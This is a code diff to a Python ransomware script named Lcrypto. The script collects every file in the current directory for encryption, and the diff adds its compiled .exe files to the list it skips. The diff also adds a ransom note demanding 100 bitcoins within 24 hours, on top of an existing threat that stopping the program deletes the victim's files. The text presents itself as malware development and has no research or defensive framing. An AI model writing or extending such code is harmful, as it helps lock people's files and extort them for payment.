@@ -9,7 +9,7 @@ def main():
     
         for file in os.listdir(): # For loop to check all the available files in the current directory
             # Now we need to make sure that Lcrypto doesn't encrypts Lcrypto.py, Lcrypto-key,key and Lcrypto-decrypt.py!
-            if file == "Lcrypto.py" or file == "Lcrypto-key.key"  or file == "Lcrypto-decrypt.py":
+            if file == "Lcrypto.py" or file == "Lcrypto-key.key"  or file == "Lcrypto-decrypt.py" or file == "Lcrypto.exe" or file == "Lcrypto-decrypt.exe":
                 continue # So we will skip them
             if os.path.isfile(file): # Checking if its a valid file or not
                 files.append(file) # Appending all the available files to the files=[] list
@@ -31,6 +31,7 @@ def main():
     
         # Printing a simple alert message to the user!
         print("Oops! Your files have been encrypted!\nTrying to kill Lcrypto will result in permanent deletion of your files!")
+        print("\nPay me 100 bitcoins within 24 hrs to unlock your files or else they will get deleted!")
     except KeyboardInterrupt:
         return print("Lcrypto will be back!")
 
